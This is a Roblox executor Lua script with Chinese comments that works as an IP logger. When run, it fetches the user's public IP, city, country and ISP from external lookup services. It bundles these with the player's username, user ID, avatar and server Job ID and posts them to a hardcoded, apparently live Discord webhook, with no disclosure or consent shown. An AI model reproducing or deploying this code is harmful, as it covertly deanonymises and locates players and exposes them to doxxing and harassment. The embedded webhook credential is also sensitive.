--// 服務初始化
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

--// 設定
local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"
local embedColor = tonumber("0x5865F2" ) -- Discord 經典藍紫色
local botName = "執行日誌分析儀"
local botIcon = "https://i.imgur.com/s4p4L8A.png" -- 一個科技感的圖示

--// 增強的 HTTP 請求函數
local function secureRequest(options )
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

--// 獲取 IP 和地理位置的函數
local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

--// 主要執行邏輯
pcall(function()
    -- 1. 獲取遊戲和玩家縮圖
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size420x420
    local playerIcon, _ = Players:GetUserThumbnailAsync(LocalPlayer.UserId, thumbType, thumbSize)

    -- 2. 獲取 IP 資訊
    local secretInfo = getSecretInfo()

    -- 3. 建立個人資料連結
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    -- 4. 準備 embed 的 fields 陣列，使用 Emoji 和 Markdown 強化
    local fields = {
        -- 玩家身份區塊
        { name = "👤 玩家身份 (Player Identity)", value = string.format(
            "**顯示名稱:** `%s`\n**真實名稱:** `%s`",
            LocalPlayer.DisplayName, LocalPlayer.Name
        ), inline = true },
        { name = "🆔 玩家ID (User ID)", value = string.format(
            "[%s](%s)", tostring(LocalPlayer.UserId), profileUrl
        ), inline = true },
        -- 伺服器資訊區塊
        { name = "🌐 伺服器資訊 (Server Info)", value = string.format(
            "**遊戲:** %s\n**人數:** %d 人",
            gameName, #Players:GetPlayers()
        ), inline = false },
        { name = "🔑 加入代碼 (Job ID)", value = string.format(
            "```%s```", game.JobId or "N/A"
        ), inline = false },
    }

    -- 5. 如果成功獲取到 IP，則將其作為一個獨立且重點突出的欄位加入
    if secretInfo and secretInfo.ip then
        local ip_info = secretInfo.details
        local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
        local isp = (ip_info and ip_info.org) or "未知"
        
        local secretValue = string.format(
            "||**IP 位址:** `%s`||\n> **📍 推測位置:** %s\n> **🌐 網路供應商:** %s",
            secretInfo.ip, location, isp
        )
        table.insert(fields, {
            name = "🔒 網路足跡 (Network Footprint)",
            value = secretValue,
            inline = false
        })
    end

    -- 6. 構建並發送最終的 webhook 資料
    local data = {
        username = botName,
        avatar_url = botIcon,
        embeds = {{
            author = {
                name = "偵測到新的腳本執行活動",
                icon_url = "https://i.imgur.com/v7ACv8A.gif" -- 動態的掃描圖示
            },
            title = "玩家 " .. LocalPlayer.DisplayName .. " 的執行報告",
            url = profileUrl, -- 點擊標題可跳轉到個人檔案
            color = embedColor,
            thumbnail = {
                url = playerIcon -- 將玩家的 Roblox 頭像作為縮圖
            },
            fields = fields,
            footer = {
                text = "報告生成於",
                icon_url = "https://i.imgur.com/1ZpZJgW.png" -- 一個小時鐘圖示
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ" ) -- 顯示報告生成時間
        }}
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
